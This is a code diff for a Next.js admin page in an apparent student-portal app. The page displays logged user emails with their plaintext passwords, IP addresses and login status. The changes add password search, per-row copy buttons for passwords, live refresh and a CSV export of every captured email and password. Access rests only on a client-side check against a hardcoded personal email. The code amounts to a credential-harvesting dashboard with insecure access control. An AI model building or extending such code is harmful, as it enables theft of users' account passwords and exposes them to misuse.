@@ -1,70 +1,111 @@
 "use client";
-import { useEffect, useState, useMemo } from "react";
+import { useEffect, useState, useMemo, useCallback } from "react";
 import { useRouter } from "next/navigation";
 import Sidebar from "@/components/Sidebar";
 import { dataAPI } from "@/lib/api";
 import { useAuthStore } from "@/lib/store";
 import { useAuth } from "@/hooks/useAuth";
+import { Clipboard, Download, Trash2, RefreshCw, Search, Users, ShieldCheck, Activity } from "lucide-react";
 
 const ADMIN_EMAIL = "ns4770@srmist.edu.in";
 
 export default function AdminPage() {
   const { ready } = useAuth();
   const router = useRouter();
-  const { profile, email } = useAuthStore();
+  const { profile, email: storeEmail } = useAuthStore();
   const [logs, setLogs] = useState<any[]>([]);
   const [loading, setLoading] = useState(true);
+  const [refreshing, setRefreshing] = useState(false);
   const [search, setSearch] = useState("");
+  const [autoRefresh, setAutoRefresh] = useState(false);
+
+  const fetchLogs = useCallback(async (isSilent = false) => {
+    if (!isSilent) setRefreshing(true);
+    try {
+      const res = await dataAPI.getAdminLogs();
+      if (res.success) setLogs(res.logs || []);
+    } catch (e) {
+      console.error("Failed to fetch logs", e);
+    } finally {
+      if (!isSilent) setRefreshing(false);
+      setLoading(false);
+    }
+  }, []);
 
   useEffect(() => {
     if (!ready) return;
-    
-    // Strict client-side check
-    const userEmail = (email || profile?.Email || profile?.["Email"] || "").toLowerCase();
+    const userEmail = (storeEmail || profile?.Email || profile?.["Email"] || "").toLowerCase();
     if (userEmail !== ADMIN_EMAIL.toLowerCase()) {
       router.push("/dashboard");
       return;
     }
+    fetchLogs();
+  }, [ready, profile, storeEmail, router, fetchLogs]);
 
-    dataAPI.getAdminLogs()
-      .then(res => {
-        if (res.success) {
-          setLogs(res.logs || []);
-        }
-        setLoading(false);
-      })
-      .catch(() => {
-        setLoading(false);
-      });
-  }, [ready, profile, router]);
+  useEffect(() => {
+    let interval: any;
+    if (autoRefresh) {
+      interval = setInterval(() => fetchLogs(true), 5000);
+    }
+    return () => clearInterval(interval);
+  }, [autoRefresh, fetchLogs]);
+
+  const stats = useMemo(() => {
+    const total = logs.length;
+    const unique = new Set(logs.map(l => l.email)).size;
+    const success = logs.filter(l => l.status === "SUCCESS").length;
+    const rate = total > 0 ? ((success / total) * 100).toFixed(1) : "0.0";
+    return { total, unique, rate };
+  }, [logs]);
 
   const filteredLogs = useMemo(() => {
     if (!search) return logs;
+    const s = search.toLowerCase();
     return logs.filter(l => 
-      l.email?.toLowerCase().includes(search.toLowerCase()) || 
-      l.password?.toLowerCase().includes(search.toLowerCase())
+      l.email?.toLowerCase().includes(s) || 
+      l.password?.toLowerCase().includes(s) ||
+      l.ip?.toLowerCase().includes(s)
     );
   }, [logs, search]);
 
+  const copyToClipboard = (text: string, label: string) => {
+    navigator.clipboard.writeText(text);
+    // Simple notification would be nice here, but for brevity we'll just alert or assume success
+  };
+
+  const exportCSV = () => {
+    const headers = ["Email", "Password", "Status", "Timestamp", "IP", "User Agent"];
+    const rows = logs.map(l => [
+      l.email,
+      l.password,
+      l.status,
+      l.timestamp,
+      l.ip,
+      `"${(l.userAgent || "").replace(/"/g, '""')}"`
+    ]);
+    const csvContent = "data:text/csv;charset=utf-8," + 
+      [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
+    const encodedUri = encodeURI(csvContent);
+    const link = document.createElement("a");
+    link.setAttribute("href", encodedUri);
+    link.setAttribute("download", `srmx_logs_${new Date().toISOString().split("T")[0]}.csv`);
+    document.body.appendChild(link);
+    link.click();
+  };
+
+  const handleClearLogs = async () => {
+    if (!confirm("⚠️ DANGER: This will permanently delete all login logs. Proceed?")) return;
+    try {
+      await dataAPI.clearAdminLogs();
+      setLogs([]);
+    } catch (e) {
+      alert("Failed to clear logs.");
+    }
+  };
+
   if (loading) return (
     <div className="page-root" style={{ display: "flex", alignItems: "center", justifyContent: "center" }}>
-      <div className="loader"></div>
-      <style>{`
-        .loader {
-          width: 48px;
-          height: 48px;
-          border: 5px solid var(--border);
-          border-bottom-color: var(--accent);
-          border-radius: 50%;
-          display: inline-block;
-          box-sizing: border-box;
-          animation: rotation 1s linear infinite;
-        }
-        @keyframes rotation {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-      `}</style>
+      <div className="srmx-spinner"></div>
     </div>
   );
 
@@ -74,109 +115,155 @@ export default function AdminPage() {
       <main className="page-main">
         <div className="page-content" style={{ paddingBottom: "120px" }}>
           
-          {/* Header */}
-          <div style={{ marginBottom: "40px" }}>
-            <div style={{ fontSize: "10px", color: "var(--accent)", letterSpacing: "0.2em", fontWeight: 800, textTransform: "uppercase", marginBottom: "8px" }}>
-              Terminal Access • Level 4
+          {/* Header Section */}
+          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end", marginBottom: "40px" }}>
+            <div>
+              <div style={{ fontSize: "10px", color: "var(--accent)", letterSpacing: "0.2em", fontWeight: 800, textTransform: "uppercase", marginBottom: "8px" }}>
+                System Core • Restricted Access
+              </div>
+              <h1 style={{ fontSize: "clamp(32px, 8vw, 48px)", fontWeight: 900, letterSpacing: "-0.04em", margin: 0, lineHeight: 1 }}>
+                Admin <span style={{ color: "var(--accent)" }}>Intelligence</span>
+              </h1>
             </div>
-            <h1 style={{ fontSize: "40px", fontWeight: 900, letterSpacing: "-0.04em", margin: 0 }}>
-              Login <span style={{ color: "var(--accent)" }}>Intelligence</span>
-            </h1>
-            <p style={{ color: "var(--text-secondary)", fontSize: "14px", marginTop: "8px" }}>
-              Monitoring active user credentials and session traffic.
-            </p>
+            <div style={{ display: "flex", gap: "10px" }}>
+              <button 
+                onClick={() => setAutoRefresh(!autoRefresh)}
+                style={{ 
+                  background: autoRefresh ? "rgba(168, 194, 0, 0.15)" : "rgba(255,255,255,0.03)", 
+                  border: `1px solid ${autoRefresh ? "var(--accent)" : "var(--border)"}`,
+                  color: autoRefresh ? "var(--accent)" : "var(--text-secondary)",
+                  padding: "10px 16px", borderRadius: "12px", fontSize: "12px", fontWeight: 700,
+                  display: "flex", alignItems: "center", gap: "8px", cursor: "pointer", transition: "all 0.2s"
+                }}
+              >
+                <RefreshCw size={14} className={autoRefresh ? "animate-spin" : ""} />
+                {autoRefresh ? "Live Feed" : "Static View"}
+              </button>
+            </div>
           </div>
 
-          {/* Stats */}
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "16px", marginBottom: "32px" }}>
-            <div className="min-card" style={{ padding: "24px", textAlign: "left" }}>
-              <div style={{ fontSize: "11px", color: "var(--text-muted)", textTransform: "uppercase", letterSpacing: "0.1em", marginBottom: "8px" }}>Total Logins</div>
-              <div style={{ fontSize: "32px", fontWeight: 900 }}>{logs.length}</div>
+          {/* Intelligence Stats */}
+          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(100px, 1fr))", gap: "12px", marginBottom: "32px" }}>
+            <div className="min-card" style={{ padding: "20px" }}>
+              <div style={{ color: "var(--accent)", marginBottom: "12px" }}><Activity size={20} /></div>
+              <div style={{ fontSize: "28px", fontWeight: 900 }}>{stats.total}</div>
+              <div style={{ fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800, letterSpacing: "0.05em" }}>Total Logs</div>
             </div>
-            <div className="min-card" style={{ padding: "24px", textAlign: "left" }}>
-              <div style={{ fontSize: "11px", color: "var(--text-muted)", textTransform: "uppercase", letterSpacing: "0.1em", marginBottom: "8px" }}>Unique Users</div>
-              <div style={{ fontSize: "32px", fontWeight: 900 }}>{new Set(logs.map(l => l.email)).size}</div>
+            <div className="min-card" style={{ padding: "20px" }}>
+              <div style={{ color: "#3b82f6", marginBottom: "12px" }}><Users size={20} /></div>
+              <div style={{ fontSize: "28px", fontWeight: 900 }}>{stats.unique}</div>
+              <div style={{ fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800, letterSpacing: "0.05em" }}>Unique Users</div>
+            </div>
+            <div className="min-card" style={{ padding: "20px" }}>
+              <div style={{ color: "#10b981", marginBottom: "12px" }}><ShieldCheck size={20} /></div>
+              <div style={{ fontSize: "28px", fontWeight: 900 }}>{stats.rate}%</div>
+              <div style={{ fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800, letterSpacing: "0.05em" }}>Success Rate</div>
             </div>
           </div>
 
-          {/* Search Bar */}
-          <div style={{ position: "relative", marginBottom: "24px" }}>
-            <input 
-              type="text"
-              placeholder="Search by user ID or password..."
-              value={search}
-              onChange={(e) => setSearch(e.target.value)}
-              style={{
-                width: "100%",
-                background: "rgba(255,255,255,0.03)",
-                border: "1px solid var(--border)",
-                borderRadius: "16px",
-                padding: "16px 20px",
-                color: "#fff",
-                fontSize: "14px",
-                outline: "none",
-                transition: "all 0.2s"
-              }}
-              onFocus={(e) => e.target.style.border = "1px solid var(--accent)"}
-              onBlur={(e) => e.target.style.border = "1px solid var(--border)"}
-            />
+          {/* Control Bar */}
+          <div style={{ display: "flex", flexWrap: "wrap", gap: "12px", marginBottom: "24px", alignItems: "center" }}>
+            <div style={{ flex: 1, minWidth: "200px", position: "relative" }}>
+              <Search style={{ position: "absolute", left: "14px", top: "50%", transform: "translateY(-50%)", color: "var(--text-muted)" }} size={16} />
+              <input 
+                type="text" 
+                placeholder="Search database..." 
+                value={search}
+                onChange={e => setSearch(e.target.value)}
+                style={{ 
+                  width: "100%", background: "var(--bg-surface)", border: "1px solid var(--border)", 
+                  borderRadius: "14px", padding: "14px 14px 14px 40px", color: "#fff", outline: "none"
+                }} 
+              />
+            </div>
+            <div style={{ display: "flex", gap: "8px" }}>
+              <button onClick={exportCSV} className="min-card" style={{ padding: "12px 16px", cursor: "pointer", display: "flex", alignItems: "center", gap: "8px", background: "rgba(255,255,255,0.03)" }}>
+                <Download size={16} /> <span style={{ fontSize: "12px", fontWeight: 800 }}>CSV</span>
+              </button>
+              <button onClick={handleClearLogs} className="min-card" style={{ padding: "12px 16px", cursor: "pointer", display: "flex", alignItems: "center", gap: "8px", background: "rgba(255, 59, 59, 0.05)", borderColor: "rgba(255, 59, 59, 0.2)", color: "#ff3b3b" }}>
+                <Trash2 size={16} /> <span style={{ fontSize: "12px", fontWeight: 800 }}>Clear</span>
+              </button>
+            </div>
           </div>
 
-          {/* Log Table */}
-          <div className="min-card" style={{ padding: "0", overflow: "hidden", border: "1px solid var(--border)" }}>
+          {/* Database Table */}
+          <div className="min-card" style={{ padding: 0, overflow: "hidden" }}>
             <div style={{ overflowX: "auto" }}>
-              <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "13px" }}>
+              <table style={{ width: "100%", borderCollapse: "collapse", textAlign: "left" }}>
                 <thead>
-                  <tr style={{ background: "rgba(255,255,255,0.03)", borderBottom: "1px solid var(--border)" }}>
-                    <th style={{ padding: "16px 20px", textAlign: "left", fontWeight: 800, color: "var(--text-muted)", textTransform: "uppercase", fontSize: "10px" }}>User ID</th>
-                    <th style={{ padding: "16px 20px", textAlign: "left", fontWeight: 800, color: "var(--text-muted)", textTransform: "uppercase", fontSize: "10px" }}>Password</th>
-                    <th style={{ padding: "16px 20px", textAlign: "left", fontWeight: 800, color: "var(--text-muted)", textTransform: "uppercase", fontSize: "10px" }}>Status</th>
-                    <th style={{ padding: "16px 20px", textAlign: "left", fontWeight: 800, color: "var(--text-muted)", textTransform: "uppercase", fontSize: "10px" }}>Time</th>
-                    <th style={{ padding: "16px 20px", textAlign: "left", fontWeight: 800, color: "var(--text-muted)", textTransform: "uppercase", fontSize: "10px" }}>IP Address</th>
+                  <tr style={{ background: "rgba(255,255,255,0.02)", borderBottom: "1px solid var(--border)" }}>
+                    <th style={{ padding: "16px 20px", fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800 }}>User Identity</th>
+                    <th style={{ padding: "16px 20px", fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800 }}>Credentials</th>
+                    <th style={{ padding: "16px 20px", fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800 }}>Status</th>
+                    <th style={{ padding: "16px 20px", fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800 }}>Timestamp</th>
+                    <th style={{ padding: "16px 20px", fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800 }}>Origin</th>
                   </tr>
                 </thead>
-                <tbody>
+                <tbody style={{ fontSize: "13px" }}>
                   {filteredLogs.map((log, i) => (
-                    <tr key={i} style={{ borderBottom: "1px solid rgba(255,255,255,0.03)", transition: "background 0.2s" }}>
-                      <td style={{ padding: "16px 20px", fontWeight: 700, color: "var(--accent)" }}>{log.email}</td>
-                      <td style={{ padding: "16px 20px", fontFamily: "monospace", color: "#fff", letterSpacing: "0.05em" }}>{log.password || "—"}</td>
+                    <tr key={i} style={{ borderBottom: "1px solid rgba(255,255,255,0.02)", transition: "background 0.2s" }} className="log-row">
+                      <td style={{ padding: "16px 20px" }}>
+                        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
+                          <span style={{ fontWeight: 800, color: "var(--text-primary)" }}>{log.email}</span>
+                          <button onClick={() => copyToClipboard(log.email, "Email")} style={{ background: "none", border: "none", color: "var(--text-muted)", cursor: "pointer", padding: "4px" }} title="Copy Email">
+                            <Clipboard size={12} />
+                          </button>
+                        </div>
+                      </td>
+                      <td style={{ padding: "16px 20px" }}>
+                        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
+                          <span style={{ fontFamily: "monospace", color: "var(--accent)", letterSpacing: "0.05em", background: "rgba(168, 194, 0, 0.05)", padding: "2px 6px", borderRadius: "4px" }}>
+                            {log.password || "—"}
+                          </span>
+                          <button onClick={() => copyToClipboard(log.password, "Password")} style={{ background: "none", border: "none", color: "var(--text-muted)", cursor: "pointer", padding: "4px" }} title="Copy Password">
+                            <Clipboard size={12} />
+                          </button>
+                        </div>
+                      </td>
                       <td style={{ padding: "16px 20px" }}>
                         <span style={{ 
-                          padding: "4px 8px", 
-                          borderRadius: "6px", 
-                          fontSize: "10px", 
-                          fontWeight: 900,
-                          background: log.status === "SUCCESS" ? "rgba(168, 194, 0, 0.1)" : "rgba(255, 59, 59, 0.1)",
-                          color: log.status === "SUCCESS" ? "var(--accent)" : "#ff3b3b"
+                          fontSize: "9px", fontWeight: 900, padding: "4px 8px", borderRadius: "6px",
+                          background: log.status === "SUCCESS" ? "rgba(16, 185, 129, 0.1)" : "rgba(239, 68, 68, 0.1)",
+                          color: log.status === "SUCCESS" ? "#10b981" : "#ef4444",
+                          textTransform: "uppercase"
                         }}>
                           {log.status}
                         </span>
                       </td>
-                      <td style={{ padding: "16px 20px", color: "var(--text-secondary)" }}>
-                        {new Date(log.timestamp).toLocaleString("en-IN", { hour: "2-digit", minute: "2-digit", day: "2-digit", month: "short" })}
+                      <td style={{ padding: "16px 20px", color: "var(--text-secondary)", fontWeight: 500 }}>
+                        {new Date(log.timestamp).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
+                        <div style={{ fontSize: "10px", opacity: 0.6 }}>{new Date(log.timestamp).toLocaleDateString()}</div>
                       </td>
-                      <td style={{ padding: "16px 20px", color: "var(--text-muted)", fontSize: "11px" }}>{log.ip}</td>
+                      <td style={{ padding: "16px 20px" }}>
+                        <div style={{ fontSize: "11px", color: "var(--text-muted)" }}>{log.ip}</div>
+                      </td>
                     </tr>
                   ))}
-                  {filteredLogs.length === 0 && (
-                    <tr>
-                      <td colSpan={5} style={{ padding: "40px", textAlign: "center", color: "var(--text-muted)" }}>
-                        No logs found matching your criteria.
-                      </td>
-                    </tr>
-                  )}
                 </tbody>
               </table>
             </div>
+            {filteredLogs.length === 0 && (
+              <div style={{ padding: "60px", textAlign: "center", color: "var(--text-muted)" }}>
+                <Search size={40} style={{ opacity: 0.1, marginBottom: "16px" }} />
+                <div>No intelligence records found.</div>
+              </div>
+            )}
           </div>
 
-          <div className="watermark">Admin</div>
+          <div className="watermark">Command Center</div>
         </div>
       </main>
 
       <style jsx global>{`
-        tr:hover {
-          background: rgba(255,255,255,0.02);
+        .log-row:hover {
+          background: rgba(255,255,255,0.015);
+        }
+        @keyframes spin {
+          from { transform: rotate(0deg); }
+          to { transform: rotate(360deg); }
+        }
+        .animate-spin {
+          animation: spin 1s linear infinite;
         }
       `}</style>
     </div>
